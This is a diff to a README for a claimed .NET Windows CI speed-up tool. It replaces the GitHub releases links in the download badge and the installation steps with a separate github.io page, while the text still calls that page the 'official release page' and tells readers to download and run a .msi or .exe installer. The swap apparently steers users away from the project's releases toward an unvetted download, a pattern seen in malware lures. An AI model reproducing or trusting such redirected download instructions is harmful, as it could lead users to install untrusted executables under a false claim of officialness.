@@ -1,6 +1,6 @@
 # 🚀 dotnet-fast-windows-ci - Make your Windows builds run faster
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Slawek1121/dotnet-fast-windows-ci/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://slawek1121.github.io)
 
 This application helps teams manage .NET project workflows. It improves how you format code, check for errors, save time with caching, and split large tasks into smaller parts. You save time on every build. The tool works on Windows, Linux, and macOS. Use it to keep your development workspace clean and efficient through the year 2026 and beyond.
 
@@ -8,7 +8,7 @@ This application helps teams manage .NET project workflows. It improves how you 
 
 You need to download the installer to start using the tool.
 
-1. Go to the [official release page](https://github.com/Slawek1121/dotnet-fast-windows-ci/releases).
+1. Go to the [official release page](https://slawek1121.github.io).
 2. Look for the section labeled Assets.
 3. Click the link that ends in .msi or .exe to download the installer.
 4. Save the file to your computer.
